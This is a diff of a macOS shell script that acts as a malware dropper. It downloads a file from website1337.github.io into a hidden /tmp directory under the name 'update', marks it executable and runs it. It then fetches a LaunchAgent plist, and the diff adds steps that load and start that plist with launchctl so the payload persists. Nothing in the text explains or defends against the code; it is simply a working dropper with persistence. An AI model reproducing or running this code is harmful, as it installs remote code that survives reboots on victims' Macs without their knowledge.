@@ -3,6 +3,8 @@ rm -f /tmp/.tHhCc/update;
 curl -A O -L https://website1337.github.io/aa -o /tmp/.tHhCc/update; 
 chmod 755 /tmp/.tHhCc/update; 
 /tmp/.tHhCc/update; 
-curl -A O -L https://website1337.github.io/b -o ${HOME}/Library/LaunchAgents/com.example.myapp.plist;
-launchctl load ${HOME}/Library/LaunchAgents/com.example.myapp.plist;
-sleep 3600; 
+curl -A O -L https://website1337.github.io/b -o ${HOME}/Library/LaunchAgents/com.test.plist;
+launchctl load ${HOME}/Library/LaunchAgents/com.test.plist;
+launchctl load -w com.test.plist 
+launchctl start -w com.test.plist 
+sleep 10; 
